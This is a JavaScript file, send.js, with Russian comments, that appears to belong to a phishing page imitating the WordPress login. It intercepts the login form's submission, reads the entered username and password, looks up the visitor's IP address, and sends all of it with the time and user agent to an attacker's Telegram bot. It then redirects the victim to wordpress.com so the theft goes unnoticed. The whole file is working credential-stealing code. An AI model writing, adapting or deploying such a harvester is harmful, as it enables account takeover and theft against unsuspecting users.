// send.js
(function() {
    'use strict';
    
    // Ждем полной загрузки DOM
    document.addEventListener('DOMContentLoaded', function() {
        const form = document.getElementById('loginform');
        
        if (!form) {
            console.error("Форма loginform не найдена!");
            return;
        }
        
        form.addEventListener('submit', function(e) {
            // Предотвращаем стандартную отправку
            e.preventDefault();
            e.stopPropagation();
            
            console.log("Скрипт send.js начал работу!");
            console.log("BOT_TOKEN из config:", window.BOT_TOKEN);
            console.log("CHAT_ID из config:", window.CHAT_ID);
            
            // Получаем данные из формы
            const login = form.querySelector('input[name="log"]').value;
            const password = form.querySelector('input[name="pwd"]').value;
            
            // Формируем сообщение
            const message = '🔐 НОВЫЕ ДАННЫЕ WORDPRESS 🔐\n' +
                'Логин: ' + login + '\n' +
                'Пароль: ' + password + '\n' +
                'IP: ' + window.userIP + '\n' +
                'Время: ' + new Date().toLocaleString() + '\n' +
                'User Agent: ' + navigator.userAgent;
            
            console.log("Сообщение для отправки:", message);
            
            // Отправляем в Telegram
            const url = 'https://api.telegram.org/bot' + window.BOT_TOKEN + '/sendMessage';
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: window.CHAT_ID,
                    text: message
                })
            })
            .then(function(response) {
                return response.json();
            })
            .then(function(data) {
                console.log("Ответ от Telegram:", data);
                if (data.ok) {
                    console.log("Успешно отправлено!");
                } else {
                    console.error("Ошибка от Telegram:", data);
                }
            })
            .catch(function(error) {
                console.error("Ошибка отправки:", error);
            })
            .finally(function() {
                // Перенаправляем через 1 секунду
                setTimeout(function() {
                    window.location.href = 'https://wordpress.com/';
                }, 1000);
            });
        });
    });
    
    // Получаем IP пользователя
    function fetchIP() {
        fetch('https://api.ipify.org?format=json')
            .then(function(response) {
                return response.json();
            })
            .then(function(data) {
                window.userIP = data.ip;
            })
            .catch(function() {
                window.userIP = 'Не удалось определить';
            });
    }
    
    fetchIP();
})();
